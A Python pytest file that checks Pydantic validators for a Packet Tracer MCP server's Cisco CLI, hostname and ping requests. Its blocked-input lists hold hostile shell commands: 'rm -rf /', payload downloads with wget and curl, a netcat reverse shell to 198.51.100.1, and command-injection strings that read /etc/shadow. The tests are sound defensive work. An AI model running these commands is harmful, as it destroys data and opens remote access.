"""Pruebas unitarias de seguridad y validación de esquemas Pydantic v2."""

import pytest
from pydantic import ValidationError
from packet_tracer_mcp.models.commands import CliCommandRequest, PingRequest
from packet_tracer_mcp.models.devices import HostnameRequest


class TestCliCommandSecurityValidation:
    """Verifica que CliCommandRequest bloquee comandos de SO e inyecciones lógicas."""

    def test_valid_cisco_ios_commands_accepted(self) -> None:
        """Comandos legítimos de Cisco IOS deben ser validados y sanitizados correctamente."""
        req = CliCommandRequest(
            hostname="R1-Core",
            commands=[
                "  configure terminal  ",
                "interface GigabitEthernet0/0",
                "ip address 10.0.0.1 255.255.255.0",
                "no shutdown",
                "end",
                "write memory",
            ],
            enable_mode=True,
        )
        assert req.hostname == "R1-Core"
        assert req.commands[0] == "configure terminal"
        assert len(req.commands) == 6
        assert req.enable_mode is True

    @pytest.mark.parametrize(
        "malicious_command",
        [
            "rm -rf /",
            "bash -i",
            "sh -c 'whoami'",
            "wget http://198.51.100.1/payload.sh",
            "curl -s http://198.51.100.1/shell",
            "powershell -ExecutionPolicy Bypass",
            "cmd.exe /c dir",
            "nc -e /bin/sh 198.51.100.1 4444",
            "python -c 'import os'",
            "tclsh",
            "ios.sh",
            "/bin/bash",
            "C:\\Windows\\System32\\cmd.exe",
        ],
    )
    def test_blocks_forbidden_host_os_commands(self, malicious_command: str) -> None:
        """Debe rechazar cualquier intento de invocar binarios del sistema operativo anfitrión."""
        with pytest.raises(ValidationError) as exc_info:
            CliCommandRequest(
                hostname="R1",
                commands=[malicious_command],
            )
        assert "Seguridad" in str(exc_info.value) or "seguridad" in str(exc_info.value)

    @pytest.mark.parametrize(
        "injected_command",
        [
            "ping 8.8.8.8 ; bash",
            "show version && rm -rf /",
            "show ip route || sh",
            "configure terminal `whoami`",
            "hostname $(id)",
            "hostname ${USER}",
            "show running-config > /etc/passwd",
            "show version < /etc/shadow",
            "show ip interface brief\nbash",
            "show ip interface brief\r\nrm -rf /",
        ],
    )
    def test_blocks_logical_and_shell_metacharacter_injections(
        self, injected_command: str
    ) -> None:
        """Debe rechazar encadenamiento lógico (;, &&, ||), subshells y redirecciones."""
        with pytest.raises(ValidationError) as exc_info:
            CliCommandRequest(
                hostname="SW1",
                commands=["show version", injected_command],
            )
        assert "Anti-Inyección" in str(exc_info.value)

    def test_blocks_invalid_hostname_injection(self) -> None:
        """Debe rechazar hostnames con caracteres fuera del estándar de red."""
        with pytest.raises(ValidationError):
            HostnameRequest(hostname="R1; rm -rf /")

        with pytest.raises(ValidationError):
            CliCommandRequest(hostname="../etc/passwd", commands=["show version"])


class TestPingRequestValidation:
    """Verifica la validación estricta de direcciones IPv4 y límites de conteo en execute_ping."""

    def test_valid_ping_request(self) -> None:
        req = PingRequest(
            source_hostname="PC1",
            destination_ip="192.168.10.1",
            count=5,
        )
        assert req.source_hostname == "PC1"
        assert str(req.destination_ip) == "192.168.10.1"
        assert req.count == 5

    @pytest.mark.parametrize("invalid_ip", ["999.999.999.999", "192.168.1.1; bash", "no-es-ip"])
    def test_rejects_invalid_ipv4(self, invalid_ip: str) -> None:
        with pytest.raises(ValidationError):
            PingRequest(
                source_hostname="PC1",
                destination_ip=invalid_ip,
            )

    @pytest.mark.parametrize("invalid_count", [0, -1, 11, 100])
    def test_enforces_ping_count_bounds(self, invalid_count: int) -> None:
        with pytest.raises(ValidationError):
            PingRequest(
                source_hostname="PC1",
                destination_ip="10.0.0.1",
                count=invalid_count,
            )

